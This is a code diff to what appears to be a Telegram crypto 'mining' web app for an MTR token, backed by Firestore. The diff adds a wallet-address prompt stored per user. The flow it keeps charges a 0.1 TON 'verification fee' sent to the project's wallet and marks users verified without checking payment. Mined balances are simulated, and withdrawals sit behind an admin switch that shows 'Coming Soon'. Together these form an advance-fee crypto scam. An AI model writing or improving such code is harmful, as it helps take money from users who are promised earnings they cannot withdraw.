@@ -115,7 +115,7 @@
                 <span class="status-badge" id="verifyStatus">Unverified</span>
             </div>
         </div>
-        <div id="walletDisplay" style="font-size: 12px; color: var(--cyan-glow); font-weight: bold; background: rgba(0,119,255,0.15); padding: 6px 10px; border-radius: 8px; border: 1px solid var(--neon-blue);" onclick="connectWallet()">
+        <div id="walletDisplay" style="font-size: 12px; color: var(--cyan-glow); font-weight: bold; background: rgba(0,119,255,0.15); padding: 6px 10px; border-radius: 8px; border: 1px solid var(--neon-blue); cursor: pointer;" onclick="connectWalletPrompt()">
             Connect Wallet
         </div>
     </div>
@@ -257,7 +257,7 @@
         let userUsername = "@master_miner";
         let userPhotoUrl = "";
         let referrerId = null;
-        let isWithdrawOpen = false; // Default status from Admin
+        let isWithdrawOpen = false;
 
         if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
             const user = tg.initDataUnsafe.user;
@@ -288,36 +288,39 @@
         }
 
         let walletConnected = false;
-        let isVerified = localStorage.getItem('mtr_verified') === 'true';
+        let connectedWalletAddress = "";
+        let isVerified = false;
         let totalBalance = 0.0000;
         let sessionMined = 0.0000;
         let refRewardBalance = 0.0000;
         let referralCount = 0;
         let completedTasks = {};
 
-        // Listen to Admin Settings (Withdraw Status)
+        // Admin Settings Sync
         db.collection("settings").doc("config").onSnapshot((doc) => {
             if(doc.exists) {
                 isWithdrawOpen = doc.data().withdrawOpen || false;
             }
         });
 
+        // Load User Data from Firestore
         db.collection("users").doc(userId).get().then(async (doc) => {
             if (doc.exists) {
                 let data = doc.data();
                 totalBalance = data.balance || 0;
                 refRewardBalance = data.refReward || 0;
                 completedTasks = data.tasks || {};
-                if(data.verified) {
-                    isVerified = true;
-                    localStorage.setItem('mtr_verified', 'true');
-                }
+                isVerified = data.verified || false;
+                walletConnected = data.walletConnected || false;
+                connectedWalletAddress = data.walletAddress || "";
             } else {
                 await db.collection("users").doc(userId).set({
                     name: userName,
                     balance: 0,
                     refReward: 0,
                     verified: false,
+                    walletConnected: false,
+                    walletAddress: "",
                     tasks: {},
                     referredBy: referrerId || null,
                     createdAt: firebase.firestore.FieldValue.serverTimestamp()
@@ -335,6 +338,7 @@
             updateUI();
         });
 
+        // Realtime listener for user updates
         db.collection("users").doc(userId).onSnapshot((doc) => {
             if(doc.exists) {
                 let data = doc.data();
@@ -345,24 +349,30 @@
             }
         });
 
-        function connectWallet() {
-            if (!walletConnected) {
+        function connectWalletPrompt() {
+            let userWalletInput = prompt("Enter your TON Wallet Address (e.g. UQ...):", connectedWalletAddress);
+            if (userWalletInput && userWalletInput.length > 20) {
                 walletConnected = true;
-                document.getElementById('walletDisplay').innerText = "UQ7b...39x1";
-                document.getElementById('profileWalletAddr').innerText = RECEIVER_WALLET;
+                connectedWalletAddress = userWalletInput;
+                db.collection("users").doc(userId).update({
+                    walletConnected: true,
+                    walletAddress: connectedWalletAddress
+                });
+                alert("Wallet connected successfully!");
                 updateUI();
+            } else if (userWalletInput !== null) {
+                alert("Invalid TON wallet address!");
             }
         }
 
         function handleMainAction() {
             if (!walletConnected) {
-                connectWallet();
+                connectWalletPrompt();
             } else if (!isVerified) {
                 let confirmPay = confirm("Account Verification requires a 0.1 TON network fee sent to project treasury. Proceed?");
                 if (confirmPay) {
                     window.open(`ton://transfer?address=${RECEIVER_WALLET}&amount=100000000&text=MTR_Verification`, '_blank');
                     isVerified = true;
-                    localStorage.setItem('mtr_verified', 'true');
                     db.collection("users").doc(userId).update({ verified: true });
                     alert("Verification completed! Mining started.");
                     updateUI();
@@ -372,10 +382,10 @@
                 sessionMined = 0.00;
                 db.collection("users").doc(userId).update({ balance: totalBalance });
                 updateUI();
+                alert("Claimed successfully!");
             }
         }
 
-        // Withdraw Handler based on Admin Switch
         function handleWithdraw() {
             if (!isWithdrawOpen) {
                 alert("🚀 Withdrawal is Coming Soon! Stay tuned for official listing.");
@@ -450,11 +460,20 @@
             let btn = document.getElementById('actionBtn');
             let badge = document.getElementById('verifyStatus');
             let rate = document.getElementById('miningRateText');
+            let walletDisp = document.getElementById('walletDisplay');
 
             document.getElementById('totalBalance').innerText = totalBalance.toFixed(4);
             document.getElementById('sessionMined').innerText = sessionMined.toFixed(4);
             document.getElementById('myRankBalance').innerText = totalBalance.toFixed(2) + " MTR";
             document.getElementById('profileBalance').innerText = totalBalance.toFixed(4) + " MTR";
+
+            if (walletConnected) {
+                walletDisp.innerText = connectedWalletAddress.substring(0, 6) + "..." + connectedWalletAddress.slice(-4);
+                document.getElementById('profileWalletAddr').innerText = connectedWalletAddress;
+            } else {
+                walletDisp.innerText = "Connect Wallet";
+                document.getElementById('profileWalletAddr').innerText = "Not Connected";
+            }
 
             if (isVerified) {
                 badge.innerText = "Verified ✓";
